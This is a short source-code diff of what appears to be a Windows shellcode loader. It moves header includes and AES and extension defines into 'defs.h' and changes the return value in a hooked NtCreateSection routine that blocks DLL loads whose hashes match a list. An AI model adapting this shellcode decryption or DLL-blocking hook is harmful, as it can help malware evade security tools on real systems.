@@ -1,35 +1,7 @@
-#define _CRT_SECURE_NO_WARNINGS
-#define _MT
-#include <Windows.h>
-
-#include <stdio.h>
-#include <string.h>
-#include <Wincrypt.h>
-#include <time.h>
-#include <process.h>
-#include <tchar.h>
-#include <psapi.h>
-#include <ntstatus.h>
-#include <winternl.h>
-#include <iostream>
-#include "sha256.h"
-
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "crypt32.lib")
+#include "defs.h"
 
 
 
-#ifndef NT_SUCCESS
-#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
-#endif
-
-
-
-#define AES_KEY_SIZE 16
-#define CHUNK_SIZE (AES_KEY_SIZE*5)
-void* offset;
-size_t size_offset;
-#define extension ".inf"
 
 
 char* encrypter_111(const char* path, BOOL isDecrypt, LPDWORD bytes, BOOL calculate) //Function to decypher shellcode files
@@ -216,7 +188,7 @@ NTSTATUS ntCreateMySection(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN
 			{
 				if (hash.compare(data_hash[counter]) == 0) //If hash of the DLL to load is equal to any of the array hashes return 0
 				{
-					return -1;
+					return 0; //If set -1, will trigger SEH exception and will show an error in the screen (but also works)
 				}
 			}
 		}
